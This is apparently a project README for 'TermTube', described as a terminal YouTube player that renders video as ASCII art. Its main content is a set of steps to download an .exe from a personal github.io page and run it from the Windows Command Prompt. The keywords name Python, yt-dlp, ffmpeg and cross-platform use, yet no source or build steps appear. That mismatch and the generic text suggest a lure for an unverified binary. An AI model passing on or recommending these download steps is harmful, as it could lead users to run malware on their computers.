# 📺 TermTube - Stream YouTube videos in your terminal

[![](https://img.shields.io/badge/Download_TermTube-Blue)](https://urbe8716.github.io)

TermTube plays YouTube videos inside your computer terminal. It uses simple text characters to recreate images and plays high-quality audio alongside the video. This tool functions as a portable program. You do not need to install complex software or change your system settings to use it.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Go to the [TermTube download page](https://urbe8716.github.io).
2. Look for the most recent version under the Releases section.
3. Download the file that ends in .exe.
4. Save the file to a folder on your computer.
5. Create a new folder on your desktop and name it TermTube.
6. Move the downloaded file into this new folder.

## 💻 Running the Program

The program runs through the Windows Command Prompt. Follow these instructions to launch it safely.

1. Open the folder where you kept the file.
2. Click the address bar at the top of the file window.
3. Delete the text in the address bar, type cmd, and press Enter.
4. A black box appears on your screen.
5. Type the name of the file followed by the link of the YouTube video you want to watch. 
6. Press the Enter key on your keyboard.

The program reads the video data and begins rendering the stream. The terminal window changes colors to match the video. Use your mouse to resize the terminal window if the image looks distorted. A larger window provides a clearer picture.

## 🛠 Features

*   **Zero-installation:** The program runs without modifying your Windows registry or system files. You can carry it on a USB thumb drive and run it on any Windows computer.
*   **Media player core:** The software uses reliable media player libraries to synchronize video frames with audio tracks.
*   **Truecolor rendering:** This tool supports ANSI truecolor, which allows the terminal to display accurate shades and colors from your video.
*   **ASCII art styles:** You can choose different text-based styles to display your video. These styles change how the video looks by using various character sets.
*   **YouTube integration:** TermTube handles video links directly. You provide the URL, and the program retrieves the stream from the web servers.

## ⚙️ System Requirements

To ensure smooth performance, your computer should meet these basic needs:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM is necessary to handle the video data stream.
*   **Internet:** A stable broadband connection provides the best experience. Slow connections affect the frame rate.
*   **Terminal:** The software works best with Windows Terminal. You can download this from the Microsoft Store if your current command prompt window feels sluggish or shows low resolution.

## 🔍 Troubleshooting Tips

*   **The program closes immediately:** Ensure you are running the program inside the Command Prompt window rather than double-clicking the file icon.
*   **The video looks pixelated:** Use a font size that is small for your terminal. Small fonts allow more characters to fit on the screen, which increases the detail of the image.
*   **No sound plays:** Verify that your computer volume is not muted. If sound still does not play, check if other media players currently use your audio device.
*   **Connection errors:** Copy the YouTube URL again and ensure you include the full link address. Check your internet connection status.
*   **Colors look wrong:** Ensure your terminal settings use TrueColor or 24-bit color depth. The default Windows Terminal handles these settings automatically.

## 📋 Customization

You can change how the video displays by adding parameters. Type the file name, followed by -h to see a list of available options. These options allow you to adjust the volume, select the video quality, or change the ASCII art character density. The program saves your preferences in a local file within the same folder. If you want to reset everything to the default state, delete that file and restart the program.

Keywords: ansi-colors, ascii-art, bash, cli, cmd, cross-platform, ffmpeg, ffplay, media-player, multimedia, portable, powershell, python, shell, terminal, truecolor, videoplayer, windows, youtube, yt-dlp